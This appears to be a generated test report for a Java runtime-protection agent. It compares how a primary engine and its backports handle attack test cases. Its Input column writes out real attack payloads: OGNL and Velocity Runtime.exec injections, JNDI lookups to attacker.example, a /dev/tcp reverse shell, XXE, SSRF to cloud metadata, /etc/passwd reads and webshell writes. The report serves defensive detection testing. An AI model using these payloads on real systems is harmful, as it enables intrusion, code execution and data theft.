- needs an expression engine on the driver's class path (a Unified EL implementation, Commons JEXL); the JDK ships neither: `el_runtime_execution`, `jexl_runtime_execution`
- needs a JSR-223 script engine: JDK 8 and 11 ship Nashorn, JDK 17 and 21 ship none, so one expectation cannot hold on every backport line: `script_engine_runtime_execution`
- needs a third-party library on the driver's class path whose classes the hook instruments (fastjson, Hessian, ActiveMQ OpenWire, DataEase, Spark or YARN, SkyWalking or MyBatis): `deserialization_fastjson_resource_url`, `deserialization_hessian_type`, `deserialization_protocol_class`, `request_jwt_verification_failure`, `request_remote_job_submission`, `sql_identifier_injection`
- reachable with JDK classes, no case yet: needs a JAAS login configuration that names JndiLoginModule: `jaas_jndi_remote_provider`
- reachable with JDK classes, no case yet: needs an MBean whose operation the rule lists, invoked through the platform MBean server: `jmx_remote_config_source`, `jmx_script_file_write`

## Where the engines differ

Attack cases whose effect differs between the primary and the backports, grouped by the pair of effects.

### Primary block, backports none

| Case | Path | Input | Primary | Backports | Why |
|---|---|---|---|---|---|
| [request_internal_resource](../rules/cases/request_internal_resource.toml) `double-encoded-web-inf-query` | request | `GET /static?/%2557EB-INF/web.xml` | block `request_internal_resource` | none | backport: the backports' path-confusion check reads the request path, not a resource named in the query string |
| [request_template_source](../rules/cases/request_template_source.toml) `locale-traversal` | request | `GET /CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en` | block `request_template_source` | none | backport: the backports accept only a remote URL as a template source, not a path traversal |
| [writeFile_generated_script](../rules/cases/writeFile_generated_script.toml) `request-plot-system-call` | request-sink | `GET /q?yrange=%5B0%3Asystem%28%27id%27%29%5D; file.write (Files.write) {tmp}/charts/chart.plot, set yrange [0:system('id')] ` | block `writeFile_generated_script` | none | backport: the backports watch plot directives written through FileOutputStream only, not through Files.write |

### Primary block, backports unreachable

| Case | Path | Input | Primary | Backports | Why |
|---|---|---|---|---|---|
| [command_dnslog](../rules/cases/command_dnslog.toml) `callback-domain-lookup-in-request` | request-sink | `GET /app/report?id=7; process.exec /nonexistent/rule-case/nslookup abc123.dnslog.cn` | block `command_dnslog` | unreachable | backport: the backports have no list of callback domains for process arguments |
| [command_error](../rules/cases/command_error.toml) `unclosed-quote-in-request` | request-sink | `GET /app/report?id=7; process.exec sh -c echo 'unclosed` | block `command_error` | unreachable | backport: the backports do not check the quoting of a shell program |
| [request_default_credential](../rules/cases/request_default_credential.toml) `tomcat-basic-default` | request | `GET /manager/html; Authorization: Basic dG9tY2F0OnRvbWNhdA==` | block `request_default_credential` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_dynamic_script_config](../rules/cases/request_dynamic_script_config.toml) `jenkins-check-script-execute` | request | `GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%2...` | block `request_dynamic_script_config` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_dynamic_script_config](../rules/cases/request_dynamic_script_config.toml) `jenkins-check-script-execute-in-json-body` | request | `POST /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript; Content-Type: application...` | block `request_dynamic_script_config` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_empty_credential_bypass](../rules/cases/request_empty_credential_bypass.toml) `empty-credentials-with-bypass-flag` | request | `POST /webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y` | block `request_empty_credential_bypass` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_expression_header](../rules/cases/request_expression_header.toml) `routing-expression-runtime` | request | `POST /functionRouter; spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")` | block `request_expression_header` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_expression_parameter](../rules/cases/request_expression_parameter.toml) `wfs-value-reference-exec` | request | `GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime()%2C%27touch%20...` | block `request_expression_parameter` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_expression_parameter](../rules/cases/request_expression_parameter.toml) `wfs-value-reference-exec-in-json-body` | request | `POST /geoserver/wfs; Content-Type: application/json` | block `request_expression_parameter` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_expression_parameter_name](../rules/cases/request_expression_parameter_name.toml) `struts-redirect-name` | request | `GET /index.action?redirect:%24%7B%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D=1` | block `request_expression_parameter_name` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_expression_path](../rules/cases/request_expression_path.toml) `ognl-in-path` | request | `GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8...` | block `request_expression_path` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_java_bean_pollution](../rules/cases/request_java_bean_pollution.toml) `class-loader-pipeline` | request | `GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di` | block `request_java_bean_pollution` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_jndi_lookup](../rules/cases/request_jndi_lookup.toml) `lookup-in-parameter` | request | `GET /solr/admin/cores?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7Bsys%3Ajava.version%7D.example.com%7D` | block `request_jndi_lookup` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_jndi_lookup](../rules/cases/request_jndi_lookup.toml) `obfuscated-lookup-in-header` | request | `GET /; X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:rmi://attacker.example/a}` | block `request_jndi_lookup` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_json_patch_expression](../rules/cases/request_json_patch_expression.toml) `json-patch-path-expression-read-to-content-length` | request | `PATCH /customers/1; Content-Type: application/json-patch+json` | block `request_json_patch_expression` | unreachable | backport: the backports have no rule that decides from the request body alone |
| [request_json_patch_expression](../rules/cases/request_json_patch_expression.toml) `json-patch-path-expression-via-input-stream` | request | `PATCH /customers/1; Content-Type: application/json-patch+json` | block `request_json_patch_expression` | unreachable | backport: the backports have no rule that decides from the request body alone |
| [request_json_patch_expression](../rules/cases/request_json_patch_expression.toml) `json-patch-path-expression-via-reader` | request | `PATCH /customers/1; Content-Type: application/json-patch+json` | block `request_json_patch_expression` | unreachable | backport: the backports have no rule that decides from the request body alone |
| [request_message_selector_expression](../rules/cases/request_message_selector_expression.toml) `stomp-selector-expression-via-input-stream` | request | `POST /gs-guide-websocket/123/abc/xhr_send; Content-Type: application/json` | block `request_message_selector_expression` | unreachable | backport: the backports have no rule that decides from the request body alone |
| [request_message_selector_expression](../rules/cases/request_message_selector_expression.toml) `stomp-selector-expression-via-reader` | request | `POST /gs-guide-websocket/123/abc/xhr_send; Content-Type: application/json` | block `request_message_selector_expression` | unreachable | backport: the backports have no rule that decides from the request body alone |
| [request_plot_command_injection](../rules/cases/request_plot_command_injection.toml) `yrange-system` | request | `GET /q?start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&yrange=[0:system(%27touch%20/tmp/success%27)]&wxh=1516x644&style=linespoint&grid=t&json` | block `request_plot_command_injection` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_remote_content_stream](../rules/cases/request_remote_content_stream.toml) `stream-url-file` | request | `GET /solr/demo/debug/dump?stream.url=file%3A%2F%2F%2Fetc%2Fpasswd` | block `request_remote_content_stream` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_remote_import_script_write](../rules/cases/request_remote_import_script_write.toml) `remote-import-into-jsp` | request | `POST /webtools/control/forgotPassword/viewdatafile?DATAFILE_LOCATION=http://attacker/rcereport.csv&DATAFILE_SAVE=./applications/accounting/webapp/accounting/...` | block `request_remote_import_script_write` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_repository_webroot_write](../rules/cases/request_repository_webroot_write.toml) `snapshot-repository-in-webroot` | request | `PUT /_snapshot/yz.jsp?location=%2Fusr%2Flocal%2Ftomcat%2Fwebapps%2Fwwwroot%2F` | block `request_repository_webroot_write` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_scheduler_shell_job](../rules/cases/request_scheduler_shell_job.toml) `glue-shell-job` | request | `POST /run?jobId=1&executorHandler=demoJobHandler&executorParams=demoJobHandler&glueType=GLUE_SHELL&glueSource=touch%20%2Ftmp%2Fsuccess&logId=1` | block `request_scheduler_shell_job` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_scheduler_shell_job](../rules/cases/request_scheduler_shell_job.toml) `glue-shell-job-in-json-body` | request | `POST /run; Content-Type: application/json` | block `request_scheduler_shell_job` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_serialized_client_state](../rules/cases/request_serialized_client_state.toml) `gzip-view-state` | request | `POST /index.xhtml?javax.faces.ViewState=H4sIAAAAAAAAA1vzloG1AAAWmZJ6BQAAAA%3D%3D&submit=Login; Content-Type: application/x-www-form-urlencoded` | block `request_serialized_client_state` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_server_side_script_put](../rules/cases/request_server_side_script_put.toml) `put-jsp-trailing-slash` | request | `PUT /1.jsp/` | block `request_server_side_script_put` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_setup_state_reset](../rules/cases/request_setup_state_reset.toml) `setup-complete-false` | request | `GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false` | block `request_setup_state_reset` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_template_loader_enable](../rules/cases/request_template_loader_enable.toml) `velocity-loader-enable-parameter` | request | `POST /solr/demo/config?config=%7B%22update-queryresponsewriter%22%3A%7B%22name%22%3A%22velocity%22%2C%22class%22%3A%22solr.VelocityResponseWriter%22%2C%22par...` | block `request_template_loader_enable` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_template_loader_enable](../rules/cases/request_template_loader_enable.toml) `velocity-loader-enable-parameter-in-json-body` | request | `POST /solr/demo/config; Content-Type: application/json` | block `request_template_loader_enable` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_template_parameter](../rules/cases/request_template_parameter.toml) `velocity-template-runtime` | request | `GET /solr/demo/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set(%24x%3D%27%27)%20%23set(%24rt%3D%24x.class.forName(%27java.lang.Runtime%27))...` | block `request_template_parameter` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_template_parameter](../rules/cases/request_template_parameter.toml) `velocity-template-runtime-in-json-body` | request | `POST /solr/demo/select; Content-Type: application/json` | block `request_template_parameter` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_typed_parameter_deserialization](../rules/cases/request_typed_parameter_deserialization.toml) `typed-parameter-name` | request | `POST /api/jsonws/invoke?cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userO...` | block `request_typed_parameter_deserialization` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_upload_filename_override](../rules/cases/request_upload_filename_override.toml) `multipart-filename-traversal` | request | `POST /index.action?fileFileName=..%2Fshell.jsp; Content-Type: multipart/form-data; boundary=----RuleCase` | block `request_upload_filename_override` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_xml_polymorphic_gadget](../rules/cases/request_xml_polymorphic_gadget.toml) `xstream-gadget-via-input-stream` | request | `POST /orders/3/edit; Content-Type: application/xml` | block `request_xml_polymorphic_gadget` | unreachable | backport: the backports have no rule that decides from the request body alone |
| [request_xml_polymorphic_gadget](../rules/cases/request_xml_polymorphic_gadget.toml) `xstream-gadget-via-reader` | request | `POST /orders/3/edit; Content-Type: application/xml` | block `request_xml_polymorphic_gadget` | unreachable | backport: the backports have no rule that decides from the request body alone |
| [request_xxe_payload](../rules/cases/request_xxe_payload.toml) `external-entity-parameter` | request | `GET /solr/demo/select?wt=xml&defType=xmlparser&q=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20message%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F...` | block `request_xxe_payload` | unreachable | backport: the backports have no request-entry rule for this input |
| [request_xxe_payload](../rules/cases/request_xxe_payload.toml) `external-entity-parameter-in-json-body` | request | `POST /solr/demo/select; Content-Type: application/json` | block `request_xxe_payload` | unreachable | backport: the backports have no request-entry rule for this input |
| [sql_derby_code_execution](../rules/cases/sql_derby_code_execution.toml) `derby-install-jar-in-request` | request-sink | `GET /app/report?id=7; sql.execute CALL SQLJ.INSTALL_JAR('http://127.0.0.1:1/x.jar', 'APP.EXPLOIT', 0)` | block `sql_derby_code_execution` | unreachable | backport: the backports have no Derby SQL rule; they check Derby code loading in the JDBC URL |
| [sql_h2_code_execution](../rules/cases/sql_h2_code_execution.toml) `h2-remote-runscript-in-request` | request-sink | `GET /app/report?id=7; sql.execute RUNSCRIPT FROM 'http://127.0.0.1:1/init.sql'` | block `sql_h2_code_execution` | unreachable | backport: the backports check H2 code execution in the JDBC URL, not in SQL text |
| [sql_h2_code_execution](../rules/cases/sql_h2_code_execution.toml) `h2-remote-runscript-outside-request` | sink | `sql.execute RUNSCRIPT FROM 'http://127.0.0.1:1/init.sql'` | block `sql_h2_code_execution` | unreachable | backport: the backports check H2 code execution in the JDBC URL, not in SQL text |
| [ssrf_common](../rules/cases/ssrf_common.toml) `callback-domain-in-request` | request-sink | `GET /app/report?id=7; net.open http://abc123.dnslog.cn/` | block `ssrf_common` | unreachable | backport: the backports have no list of callback domains for outbound URLs |
| [ssrf_obfuscate](../rules/cases/ssrf_obfuscate.toml) `hex-loopback-in-request` | request-sink | `GET /app/report?id=7; net.open http://0x7f000001:{port}/` | block `ssrf_obfuscate` | unreachable | backport: the backports do not check how an outbound host is written |
| [ssrf_protocol](../rules/cases/ssrf_protocol.toml) `ftp-url-in-request` | request-sink | `GET /app/report?id=7; net.open ftp://127.0.0.1:1/etc/passwd` | block `ssrf_protocol` | unreachable | backport: the backports check outbound HTTP destinations only, not the URL scheme |
| [writeFile_generated_script](../rules/cases/writeFile_generated_script.toml) `request-shell-script-exec` | request-sink | `POST /app/jobs?script=%23%21%2Fbin%2Fsh%0Aexec%28%27id%27%29%0A; file.write (Files.write) {tmp}/cache/run.sh, #!/bin/sh exec('id') ` | block `writeFile_generated_script` | unreachable | backport: the backports have no generated-script rule, and their script-write rule needs a web root or a ../ in the path |
| [xpath_runtime](../rules/cases/xpath_runtime.toml) `runtime-exec-extension-in-request` | request-sink | `GET /app/report?id=7; xpath.evaluate rt:exec(rt:getRuntime(), 'id')` | block `xpath_runtime` | unreachable | backport: the backports have no XPath expression rule |

### Primary log, backports block

| Case | Path | Input | Primary | Backports | Why |
|---|---|---|---|---|---|
| [archive_traversal](../rules/cases/archive_traversal.toml) `entry-escapes-outside-request` | sink | `archive.extract ../../evil.txt, {tmp}/extract/a/b` | log `archive_traversal` | block `archive_entry_traversal_write` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [classloader_remote](../rules/cases/classloader_remote.toml) `http-codebase-outside-request` | sink | `classloader.remote http://127.0.0.1:{port}/, RemoteGreeting` | log `classloader_remote` | block `classloader_remote_codebase` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [command_common](../rules/cases/command_common.toml) `reverse-shell-shape` | sink | `process.exec /nonexistent/rule-case/sh -c bash -i >& /dev/tcp/127.0.0.1/9 0>&1` | log `command_common` | block `command_execution_exploit_primitive` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [command_common](../rules/cases/command_common.toml) `runtime-exec-reads-passwd` | sink | `process.exec (Runtime.exec) sh -c cat /etc/passwd` | log `command_common` | block `command_execution_exploit_primitive` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [command_common](../rules/cases/command_common.toml) `shell-reads-passwd-outside-request` | sink | `process.exec sh -c cat /etc/passwd` | log `command_common` | block `command_execution_exploit_primitive` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [deserialization_blacklist](../rules/cases/deserialization_blacklist.toml) `jdbc-rowset` | sink | `deserialize com.sun.rowset.JdbcRowSetImpl` | log `deserialization_blacklist` | block `deserialization_gadget_class` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [deserialization_blacklist](../rules/cases/deserialization_blacklist.toml) `templates-impl-outside-request` | sink | `deserialize com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` | log `deserialization_blacklist` | block `deserialization_gadget_class` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [deserialization_gadget](../rules/cases/deserialization_gadget.toml) `bean-comparator-outside-request` | sink | `deserialize org.apache.commons.beanutils.BeanComparator` | log `deserialization_gadget` | block `deserialization_gadget_class` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [jdbc_h2_init](../rules/cases/jdbc_h2_init.toml) `h2-init-runscript-outside-request` | sink | `jdbc.connect jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://127.0.0.1:{port}/init.sql'` | log `jdbc_h2_init` | block `jdbc_h2_code_execution` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [jndi_disable_all](../rules/cases/jndi_disable_all.toml) `ldap-lookup-outside-request` | sink | `jndi.lookup ldap://127.0.0.1:1/Exploit` | log `jndi_disable_all` | block `jndi_remote_lookup` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [jndi_disable_all](../rules/cases/jndi_disable_all.toml) `rmi-lookup` | sink | `jndi.lookup rmi://127.0.0.1:1/Exploit` | log `jndi_disable_all` | block `jndi_remote_lookup` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [ssrf_aws](../rules/cases/ssrf_aws.toml) `metadata-address-outside-request` | sink | `net.open http://169.254.169.254/latest/meta-data/` | log `ssrf_aws` | block `ssrf_cloud_metadata` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [writeFile_reflect](../rules/cases/writeFile_reflect.toml) `jsp-through-reflection` | sink | `file.write (reflection) {tmp}/webapps/ROOT/r.jsp, <%= 1 %>` | log `writeFile_reflect` | block `file_script_write` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [xxe_file](../rules/cases/xxe_file.toml) `passwd-entity-outside-request` | sink | `xml.parse <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>` | log `xxe_file` (also `xxe_protocol`) | block `xxe_external_entity_protocol` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [xxe_protocol](../rules/cases/xxe_protocol.toml) `external-dtd` | sink | `xml.parse <?xml version="1.0"?><!DOCTYPE r SYSTEM "http://127.0.0.1:{port}/ext.dtd"><r>&remote;</r>` | log `xxe_protocol` | block `xxe_external_entity_protocol` | primary: the primary blocks this only inside an HTTP request; outside one it logs |
| [xxe_protocol](../rules/cases/xxe_protocol.toml) `http-entity-outside-request` | sink | `xml.parse <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:{port}/entity.txt">]><r>&x;</r>` | log `xxe_protocol` | block `xxe_external_entity_protocol` | primary: the primary blocks this only inside an HTTP request; outside one it logs |

### Primary log, backports unreachable

| Case | Path | Input | Primary | Backports | Why |
|---|---|---|---|---|---|
| [command_dnslog](../rules/cases/command_dnslog.toml) `callback-domain-lookup` | sink | `process.exec /nonexistent/rule-case/nslookup abc123.dnslog.cn` | log `command_dnslog` | unreachable | primary: the primary blocks this only inside an HTTP request; outside one it logs; backport: the backports have no list of callback domains for process arguments |
| [command_error](../rules/cases/command_error.toml) `unclosed-quote` | sink | `process.exec sh -c echo 'unclosed` | log `command_error` | unreachable | primary: the primary blocks this only inside an HTTP request; outside one it logs; backport: the backports do not check the quoting of a shell program |
| [ssrf_common](../rules/cases/ssrf_common.toml) `callback-domain-outside-request` | sink | `net.open http://abc123.dnslog.cn/` | log `ssrf_common` | unreachable | primary: the primary blocks this only inside an HTTP request; outside one it logs; backport: the backports have no list of callback domains for outbound URLs |
| [ssrf_obfuscate](../rules/cases/ssrf_obfuscate.toml) `hex-loopback-outside-request` | sink | `net.open http://0x7f000001:{port}/` | log `ssrf_obfuscate` | unreachable | primary: the primary blocks this only inside an HTTP request; outside one it logs; backport: the backports do not check how an outbound host is written |
| [ssrf_protocol](../rules/cases/ssrf_protocol.toml) `ftp-url-outside-request` | sink | `net.open ftp://127.0.0.1:1/etc/passwd` | log `ssrf_protocol` | unreachable | primary: the primary blocks this only inside an HTTP request; outside one it logs; backport: the backports check outbound HTTP destinations only, not the URL scheme |
| [xpath_runtime](../rules/cases/xpath_runtime.toml) `runtime-exec-extension-outside-request` | sink | `xpath.evaluate rt:exec(rt:getRuntime(), 'id')` | log `xpath_runtime` | unreachable | primary: the primary blocks this only inside an HTTP request; outside one it logs; backport: the backports have no XPath expression rule |

### Primary none, backports block

| Case | Path | Input | Primary | Backports | Why |
|---|---|---|---|---|---|
| [java_compile_runtime](../rules/cases/java_compile_runtime.toml) `runtime-exec-source-outside-request` | sink | `java.compile public class Generated { public void run() throws Exception { Runtime.getRuntime().exec("id"); } }` | none | block `java_compile_runtime_execution` | primary: the primary decides compilation only inside an HTTP request |
| [jdbc_mysql_deserialization](../rules/cases/jdbc_mysql_deserialization.toml) `mysql-autodeserialize-in-request` | request-sink | `GET /app/report?id=7; jdbc.connect jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInt...` | none | block `jdbc_mysql_deserialization` | primary: the primary flags this URL only when a request parameter carries it; this request does not |
| [jdbc_mysql_deserialization](../rules/cases/jdbc_mysql_deserialization.toml) `mysql-autodeserialize-outside-request` | sink | `jdbc.connect jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor` | none | block `jdbc_mysql_deserialization` | primary: the primary flags this URL only when a request parameter carries it; outside a request there is none |
| [readFile_unwanted](../rules/cases/readFile_unwanted.toml) `passwd-read-nio` | sink | `file.read (Files.readAllBytes) /etc/passwd` | none | block `file_sensitive_read` | primary: the primary decides sensitive host reads only inside an HTTP request |
| [readFile_unwanted](../rules/cases/readFile_unwanted.toml) `passwd-read-outside-request` | sink | `file.read /etc/passwd` | none | block `file_sensitive_read` | primary: the primary decides sensitive host reads only inside an HTTP request |
| [writeFile_script](../rules/cases/writeFile_script.toml) `jsp-in-webroot-nio` | sink | `file.write (Files.write) {tmp}/webapps/ROOT/shell.jsp, <%= 1 %>` | none | block `file_script_write` | primary: the primary decides script writes only inside an HTTP request |
| [writeFile_script](../rules/cases/writeFile_script.toml) `jsp-in-webroot-outside-request` | sink | `file.write {tmp}/webapps/ROOT/shell.jsp, <%= 1 %>` | none | block `file_script_write` | primary: the primary decides script writes only inside an HTTP request |
| [xml_decoder_runtime](../rules/cases/xml_decoder_runtime.toml) `process-builder-outside-request` | sink | `beans.decode <?xml version="1.0"?><java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="2"><void index="0"><string>echo</str...` | none | block `xml_decoder_runtime_execution` | primary: the primary decides XMLDecoder statements only inside an HTTP request |
| [xml_decoder_webshell](../rules/cases/xml_decoder_webshell.toml) `print-writer-jsp-outside-request` | sink | `beans.decode <?xml version="1.0"?><java><object class="java.io.PrintWriter"><string>{tmp}/webapps/ROOT/d.jsp</string><void method="println"><string>&lt;%= 1 ...` | none | block `xml_decoder_script_file_write` | primary: the primary decides XMLDecoder statements only inside an HTTP request |

### Primary none, backports unreachable

| Case | Path | Input | Primary | Backports | Why |
|---|---|---|---|---|---|
| [request_json_patch_expression](../rules/cases/request_json_patch_expression.toml) `json-patch-path-expression-never-read` | request | `PATCH /customers/1; Content-Type: application/json-patch+json` | none | unreachable | primary: the handler never reads the body and the agent does not read it either: a body the application does not read is never inspected; backport: the backports have no rule that decides from the request body alone |
| [sql_derby_code_execution](../rules/cases/sql_derby_code_execution.toml) `derby-install-jar-outside-request` | sink | `sql.execute CALL SQLJ.INSTALL_JAR('http://127.0.0.1:1/x.jar', 'APP.EXPLOIT', 0)` | none | unreachable | primary: the primary decides Derby SQL only inside an HTTP request; backport: the backports have no Derby SQL rule; they check Derby code loading in the JDBC URL |

### Primary unreachable, backports block

| Case | Path | Input | Primary | Backports | Why |
|---|---|---|---|---|---|
| [file_generated_plot_script_command](../rules/cases/file_generated_plot_script_command.toml) `plot-directive-in-request` | request-sink | `GET /app/report?id=7; file.write {tmp}/charts/chart.plot, set yrange [0:system(0)] ` | unreachable | block `file_generated_plot_script_command` | primary: the primary has no plot-stream write rule; it reads plot commands at request entry (request_plot_command_injection) |
| [file_generated_plot_script_command](../rules/cases/file_generated_plot_script_command.toml) `plot-directive-outside-request` | sink | `file.write {tmp}/charts/chart.plot, set yrange [0:system(0)] ` | unreachable | block `file_generated_plot_script_command` | primary: the primary has no plot-stream write rule; it reads plot commands at request entry (request_plot_command_injection) |
| [jdbc_derby_code_loading](../rules/cases/jdbc_derby_code_loading.toml) `derby-classpath-in-request` | request-sink | `GET /app/report?id=7; jdbc.connect jdbc:derby:memory:db;create=true;derby.database.classpath=APP.EXPLOIT` | unreachable | block `jdbc_derby_code_loading` | primary: the primary decides Derby code loading from SQL text, not from the JDBC URL |
| [jdbc_derby_code_loading](../rules/cases/jdbc_derby_code_loading.toml) `derby-classpath-outside-request` | sink | `jdbc.connect jdbc:derby:memory:db;create=true;derby.database.classpath=APP.EXPLOIT` | unreachable | block `jdbc_derby_code_loading` | primary: the primary decides Derby code loading from SQL text, not from the JDBC URL |
| [request_session_file_deserialization](../rules/cases/request_session_file_deserialization.toml) `filesystem-shaped-session-id` | request | `GET /; Cookie: JSESSIONID=.deserialize` | unreachable | block `request_session_file_deserialization` | primary: the primary decides session-file deserialization when the container loads the session, not at request entry |
